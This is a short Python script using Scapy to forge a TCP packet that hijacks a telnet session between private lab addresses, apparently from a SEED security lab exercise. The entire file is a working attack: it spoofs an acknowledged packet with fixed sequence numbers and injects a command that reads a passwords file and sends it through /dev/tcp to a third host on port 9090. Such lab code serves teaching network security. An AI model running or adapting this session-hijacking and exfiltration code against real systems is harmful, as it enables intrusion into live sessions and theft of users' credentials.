#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

IPLayer = IP(src="10.0.2.15", dst="10.0.2.4")
TCPLayer = TCP(sport=46716, dport=23, flags="A", seq=3809825950, ack=1182374470)

Data = "\r cat /home/seed/Desktop/passwords.txt > /dev/tcp/10.0.2.5/9090\r"
pkt = IPLayer/TCPLayer/Data

pkt.show()
send(pkt,verbose=0)
